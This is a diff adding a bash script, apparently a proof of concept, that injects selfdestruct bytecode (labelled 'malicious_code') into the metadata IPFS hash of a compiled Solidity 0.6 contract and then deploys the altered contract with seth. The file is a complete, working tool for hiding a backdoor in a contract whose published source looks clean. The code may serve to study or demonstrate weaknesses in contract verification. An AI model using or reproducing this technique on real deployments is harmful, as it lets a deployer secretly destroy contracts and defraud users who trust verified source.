@@ -1,0 +1,90 @@
+#!/usr/bin/env bash
+
+default_json_path="out/dapp.sol.json"
+default_contract_path="src/MetaJumper06.sol:MetaJumper06"
+malicious_code="5b6000ff" # jumpdest, push 0x0, selfdestruct
+
+[[ $JUMPER_JSON_PATH ]] || \
+    echo "warning: JUMPER_JSON_PATH not set, using ${default_json_path}"
+[[ $JUMPER_CONTRACT_PATH ]] || \
+    echo "warning: JUMPER_CONTRACT_PATH not set, using ${default_contract_path}"
+
+function metafy_bytecode_solc06() {
+    # metadata from solc 0.6 output:
+    # 0xa2 0x64 'i' 'p' 'f' 's' 0x58 0x22 <34 bytes IPFS hash>
+    # 0x64 's' 'o' 'l' 'c' 0x43 <3 byte version encoding>
+    # 0x00 0x33
+    #
+    # in hex
+    # 0xa2 64 69 70 66 73 58 22 <34 bytes IPFS hash>
+    # 0x64 73 6f 6c 63 43 <3 byte version encoding>
+    # 0x00 33
+    #
+    # we want to put our malicious metadata at the end of the IPFS hash
+    # 8 bytes to ipfs hash
+    # 34 bytes ipfs hash
+    # 11 bytes tail
+
+    local bytecode=$1
+    local runtime=${bytecode:0:-106}
+    local metadata=${bytecode: -106}
+    local metadata_head=${metadata:0:16}
+    local ipfs_hash=${metadata:${#metadata_head}:68}
+    local metadata_tail=${metadata:$((${#metadata_head}+${#ipfs_hash}))}
+
+    # sanity check. metadata should start as above
+    if [ "$metadata_head" != "a264697066735822" ]; then
+        >&2 echo "ERROR: could not identify metadata.";
+        exit 1
+    fi
+
+    # replace all 6's and 7's in the ipfs hash with other values
+    # hack to prevent malicious code jumpdest from being in a push instruction
+    local ipfs_hash_pushless=${ipfs_hash//6/2}
+    local ipfs_hash_pushless=${ipfs_hash_pushless//7/3}
+
+    # replace the last 4 bytes of ipfs hash with our malicious code
+    local malicious_ipfs_hash="${ipfs_hash_pushless:0:-${#malicious_code}}${malicious_code}"
+    # new bytecode is runtime ++ metadata_head ++ malicious_ipfs_hash ++ metadata_tail
+    local malicious_bytecode="${runtime}${metadata_head}${malicious_ipfs_hash}${metadata_tail}"
+
+    if [ ${#malicious_bytecode} != ${#bytecode} ]; then
+        # whoops
+        >&2 echo "ERROR: resulting bytecode malformed.";
+        >&2 echo $malicious_bytecode;
+        exit 1
+    fi
+    echo ${malicious_bytecode}
+}
+
+function get_bytecode() {
+    echo $(cat "${JUMPER_JSON_PATH:-$default_json_path}" \
+        | jq -r '.contracts."'${JUMPER_CONTRACT_PATH:-$default_contract_path}'".bin')
+}
+
+function confirm_deployment() {
+    echo "bytecode to deploy: $1"
+    echo "ETH_RPC_URL: ${ETH_RPC_URL}"
+    echo "ETH_FROM: ${ETH_FROM}"
+    read -r -p "${2:-Continue? [y/N]} " response
+    response=${response,,}    # tolower
+    if [[ "$response" =~ ^(yes|y)$ ]]
+    then
+        true
+    else
+        false
+    fi
+}
+
+function deploy() {
+    echo "deploying..."
+    echo "---------------------"
+    seth send --create $1
+}
+
+set -e
+og_bytecode=$(get_bytecode)
+echo -e "\nOriginal bytecode: ${og_bytecode}\n"
+new_bytecode=$(metafy_bytecode_solc06 ${og_bytecode})
+
+confirm_deployment $new_bytecode && deploy $new_bytecode
